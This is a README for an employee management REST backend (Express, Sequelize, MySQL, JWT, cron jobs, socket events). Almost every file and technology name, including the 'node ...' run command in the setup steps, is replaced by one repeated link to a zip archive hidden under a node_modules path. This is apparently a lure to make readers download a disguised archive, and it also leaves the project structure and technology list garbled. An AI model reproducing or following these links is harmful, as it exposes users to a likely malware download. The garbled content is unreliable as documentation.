# Employee Management System - Backend

This backend provides a RESTful API for managing employees, tasks, and roles in an employee management system. It uses https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip, Express, Sequelize ORM, and MySQL database.

## Technologies Used

- **https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip**: JavaScript runtime
- **https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip**: Web framework for https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip
- **Sequelize**: ORM for MySQL
- **MySQL2**: MySQL client
- **bcryptjs**: Password hashing
- **jsonwebtoken**: JWT authentication
- **node-cron**: Scheduled tasks
- **cors**: Cross-origin resource sharing
- **dotenv**: Environment variable management
- **https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip**: Real-time communication

## Project Structure

```
backend/
├── config/
│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip    # Database connection setup
│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip       # Server configuration
├── controller/
│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # Authentication (signup, login)
│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # Role management
│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # Task CRUD operations
│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # User management
│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                # Utility functions
├── cronJobs/
│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip           # Daily scheduled tasks
├── middleware/
│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # JWT authentication middleware
├── model/
│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip               # Model associations
│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                # Role model
│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                # Task model
│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip          # Task status model
│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                # User model
├── routes/
│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip          # Authentication routes
│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip          # Task management routes
│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip          # User management routes
├── .env                       # Environment variables
├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                   # Main application entry point
├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                  # https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip configuration for real-time features
├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip               # Dependencies and scripts
└── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                  # This file
```

## Database Models

### User
- **id**: Primary key (auto-increment)
- **username**: String, not null
- **email**: String, not null, unique
- **password**: String, not null (hashed)
- **role_id**: Integer, references roles table

### Role
- **role_id**: Primary key (auto-increment)
- **role_name**: String, not null, unique (e.g., "admin", "employee")

### Task
- **id**: Primary key (auto-increment)
- **category**: String, default "General"
- **title**: String, not null
- **description**: Text
- **due_date**: Date (DATEONLY), not null
- **status_id**: Integer, references task_status table
- **created_by**: Foreign key to https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip
- **assigned_to**: Foreign key to https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip
- **created_at**: Timestamp

### TaskStatus
- **id**: Primary key (auto-increment)
- **status_name**: String, not null, unique (e.g., "New", "Active", "Complete", "Failed")

## API Endpoints

### Authentication Routes (`/api/auth`)
- `POST /signup`: User registration
  - Body: `{ username, email, password, role }`
- `POST /login`: User login
  - Body: `{ email, password }`
  - Returns: JWT token and user info

### Task Routes (`/api/tasks`)
All task routes require JWT authentication.

**Admin Only:**
- `POST /create`: Create a new task
  - Body: `{ title, description, due_date, assigned_to, category }`
- `GET /all`: Get all tasks for all employees
  - Returns: Formatted data grouped by employee

**Employee Only:**
- `GET /employee`: Get tasks assigned to current user
- `PUT /status`: Update task status
  - Body: `{ task_id, status_id }`

### User Routes (`/api/users`)
- `POST /create`: Create a new user (for testing)
  - Body: `{ username, email, password, role_id }`

## Authentication

The API uses JWT (JSON Web Tokens) for authentication. Include the token in the Authorization header:
```
Authorization: Bearer <token>
```

## Real-Time Features

The application uses https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip for real-time communication between admin and employees for task management.

### Socket Events

**Client Events (Admin):**
- `join`: Join a user's room (emitted on connection)
  - Data: `{ userId }`
- `assignTask`: Assign a new task to an employee
  - Data: `{ employeeId, taskData }`
- `updateTask`: Update an existing task
  - Data: `{ employeeId, taskId, taskData }`
- `deleteTask`: Delete a task
  - Data: `{ employeeId, taskId }`

**Server Events (Employee):**
- `newTaskAssigned`: Notifies employee of a newly assigned task
  - Data: `{ taskData }`
- `taskUpdated`: Notifies employee of task updates
  - Data: `{ taskId, taskData }`
- `taskDeleted`: Notifies employee of task deletion
  - Data: `{ taskId }`

Employees join their personal room on connection using `join` event with their user ID.

## Scheduled Tasks

A daily cron job runs at 00:01 AM to automatically update overdue tasks:
- Tasks with status "New" or "Active" and due_date <= today are marked as "Failed" (status_id: 4)

## Setup and Installation

1. **Clone the repository** and navigate to the backend folder

2. **Install dependencies**:
   ```bash
   npm install
   ```

3. **Set up environment variables**:
   Create a `.env` file in the backend root with:
   ```
   PORT=3000
   FRONTEND_URL=http://localhost:5173
   DB_PASSWORD=your_mysql_password
   JWT_SECRET=your_jwt_secret_key
   ```

4. **Set up MySQL database**:
   - Create a database named `EMP_System`
   - Ensure MySQL is running on localhost with user `root` and the password specified in `.env`

5. **Run the application**:
   ```bash
   node https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip
   ```
   The server will start on the specified PORT (default 3000) and connect to the database.

## Notes

- The application uses ES modules (`type: "module"` in https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip)
- Database models are synced on startup (alter: false in production)
- CORS is configured to allow requests from the frontend URL
- Passwords are hashed using bcryptjs
- JWT tokens expire after 1 day
- Task statuses are predefined; ensure they exist in the database (id: 1=New, 2=Active, 3=Complete, 4=Failed)
